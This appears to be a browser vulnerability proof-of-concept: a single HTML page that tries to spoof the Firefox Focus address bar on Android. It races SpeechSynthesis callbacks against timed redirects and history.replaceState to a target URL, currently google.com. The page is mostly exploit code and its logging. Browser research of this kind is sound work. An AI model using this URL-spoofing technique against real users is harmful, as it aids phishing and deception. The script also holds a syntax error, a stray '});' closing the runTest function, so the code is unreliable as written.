<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Speech Test</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body {
    font-family: -apple-system, Arial, sans-serif;
    background: #1a1a2e;
    color: #fff;
    text-align: center;
    padding: 40px 20px;
    min-height: 100vh;
  }
  h2 { margin-bottom: 8px; font-size: 20px; }
  p.sub { color: #888; font-size: 13px; margin-bottom: 24px; }
  button {
    padding: 18px 36px;
    font-size: 18px;
    background: #e94560;
    color: #fff;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    width: 100%;
    max-width: 320px;
  }
  button:active { background: #c23152; }
  button:disabled { background: #444; cursor: default; }
  #log {
    margin-top: 24px;
    background: #16213e;
    padding: 16px;
    border-radius: 8px;
    font-family: monospace;
    font-size: 12px;
    text-align: left;
    max-height: 60vh;
    overflow-y: auto;
  }
  .green { color: #00b894; }
  .yellow { color: #fdcb6e; }
  .red { color: #e94560; }
  .white { color: #dfe6e9; }
  .info-box {
    background: #16213e;
    border: 1px solid #2d3436;
    border-radius: 8px;
    padding: 12px;
    margin-bottom: 20px;
    font-size: 12px;
    text-align: left;
  }
  .info-box .label { color: #636e72; }
  .info-box .value { color: #00b894; }
</style>
</head>
<body>

<h2>🔊 SpeechSynthesis Address Bar Test</h2>
<p class="sub">Firefox Focus 151 • Android 15 • Race Condition PoC</p>

<div class="info-box">
  <div><span class="label">UA: </span><span class="value" id="uaTxt">...</span></div>
  <div><span class="label">Speech API: </span><span class="value" id="apiTxt">...</span></div>
  <div><span class="label">Voices: </span><span class="value" id="voiceTxt">...</span></div>
  <div><span class="label">Tests run: </span><span class="value" id="testCount">0</span></div>
</div>

<button id="testBtn">🔊 Speak & Redirect</button>

<div id="log">
  <div class="green">[Ready] Click button to test</div>
</div>

<script>
// ============================================
// CONFIG
// ============================================
const TARGET = 'https://www.google.com';
const logEl = document.getElementById('log');
let testsRun = 0;
let speechStartTime = 0;
let redirectFired = false;

function log(msg, color) {
  color = color || 'green';
  var div = document.createElement('div');
  div.className = color;
  var ts = new Date().toTimeString().split(' ')[0];
  div.textContent = '[' + ts + '] ' + msg;
  logEl.prepend(div);
}

function updateInfo(id, val) {
  var el = document.getElementById(id);
  if (el) el.textContent = val;
}

// ============================================
// BROWSER INFO
// ============================================
window.addEventListener('load', function() {
  var ua = navigator.userAgent;
  updateInfo('uaTxt', ua.substring(0, 80));
  updateInfo('apiTxt', ('speechSynthesis' in window) ? 'SUPPORTED' : 'NOT SUPPORTED');

  var loadVoices = function() {
    var v = speechSynthesis.getVoices();
    updateInfo('voiceTxt', v.length + ' voices');
    var enVoices = v.filter(function(x) { return x.lang.startsWith('en'); });
    if (enVoices.length > 0) {
      log('English voices: ' + enVoices.map(function(x){return x.name}).join(', '), 'white');
    }
  };

  loadVoices();
  speechSynthesis.onvoiceschanged = loadVoices;

  // Android 15 / FF Focus specific info
  log('Platform: ' + navigator.platform, 'white');
  log('Cookies enabled: ' + navigator.cookieEnabled, 'white');
  log('JS engine hints: ' + (typeof WebAssembly !== 'undefined' ? 'WASM yes' : 'WASM no'), 'white');
});

// ============================================
// CORE TEST
// ============================================
document.getElementById('testBtn').addEventListener('click', function() {
  var btn = this;
  btn.disabled = true;
  testsRun++;
  updateInfo('testCount', testsRun);
  redirectFired = false;

  log('=== TEST #' + testsRun + ' ===', 'white');
  log('Starting race condition test...', 'yellow');

  // Cancel any ongoing speech
  speechSynthesis.cancel();

  // Load voices
  var voices = speechSynthesis.getVoices();
  if (!voices.length) {
    log('Waiting for voices...', 'yellow');
    speechSynthesis.onvoiceschanged = function() {
      voices = speechSynthesis.getVoices();
      runTest(voices, btn);
    };
    // Timeout fallback
    setTimeout(function() {
      voices = speechSynthesis.getVoices();
      if (voices.length > 0) runTest(voices, btn);
      else {
        log('No voices available, using default', 'yellow');
        runTest([], btn);
      }
    }, 2000);
  } else {
    runTest(voices, btn);
  }
});

function runTest(voices, btn) {
  var voice = voices.find(function(v) { return v.lang.startsWith('en'); }) || voices[0] || null;
  log('Voice: ' + (voice ? voice.name : 'default'), 'green');

  // ==========================================
  // STRATEGY 1: Redirect on speechstart
  // ==========================================
  var utter1 = new SpeechSynthesisUtterance('Security alert. Redirecting.');
  utter1.lang = 'en-US';
  utter1.rate = 1.5;
  utter1.volume = 0.5;
  if (voice) utter1.voice = voice;

  utter1.onstart = function() {
    speechStartTime = performance.now();
    log('Speech STARTED - race window open!', 'yellow');

    // Fire redirect at multiple delays to find the sweet spot
    var delays = [0, 5, 10, 15, 20, 30, 50, 75, 100, 150, 200];
    delays.forEach(function(d) {
      setTimeout(function() {
        if (!redirectFired) {
          redirectFired = true;
          var elapsed = Math.round(performance.now() - speechStartTime);
          log('>>> REDIRECT @ +' + d + 'ms (speech elapsed: ' + elapsed + 'ms)', 'red');
          window.location.href = TARGET;
        }
      }, d);
    });
  };

  utter1.onend = function() {
    var elapsed = Math.round(performance.now() - speechStartTime);
    log('Speech ended @ ' + elapsed + 'ms', 'green');
    if (!redirectFired) {
      redirectFired = true;
      log('>>> REDIRECT (fallback onend)', 'red');
      window.location.href = TARGET;
    }
  };

  utter1.onerror = function(e) {
    log('Speech error: ' + e.error, 'red');
    if (!redirectFired) {
      redirectFired = true;
      log('>>> REDIRECT (fallback onerror)', 'red');
      window.location.href = TARGET;
    }
  };

  // ==========================================
  // STRATEGY 2: History manipulation before speech
  // ==========================================
  try {
    history.replaceState({t: Date.now()}, '', TARGET);
    log('history.replaceState to target URL done', 'white');
  } catch(e) {
    log('replaceState failed: ' + e.message, 'red');
  }

  // ==========================================
  // STRATEGY 3: Warm-up trick for FF Focus
  // ==========================================
  try {
    var warm = new SpeechSynthesisUtterance('');
    warm.volume = 0;
    warm.rate = 3;
    speechSynthesis.speak(warm);
    speechSynthesis.cancel();
    log('Warm-up done', 'white');
  } catch(e) {}

  // Small delay then fire main utterance
  setTimeout(function() {
    try {
      speechSynthesis.speak(utter1);
      log('speak() called', 'green');

      // FF Focus hack: pause/resume kickstart
      setTimeout(function() {
        try {
          speechSynthesis.pause();
          speechSynthesis.resume();
          log('pause/resume kickstart', 'white');
        } catch(e) {}
      }, 30);

    } catch(e) {
      log('speak() exception: ' + e.message, 'red');
      if (!redirectFired) {
        redirectFired = true;
        window.location.href = TARGET;
      }
    }
  }, 100);

  // Safety: re-enable button after 5s
  setTimeout(function() { btn.disabled = false; }, 5000);
});
</script>

</body>
</html>
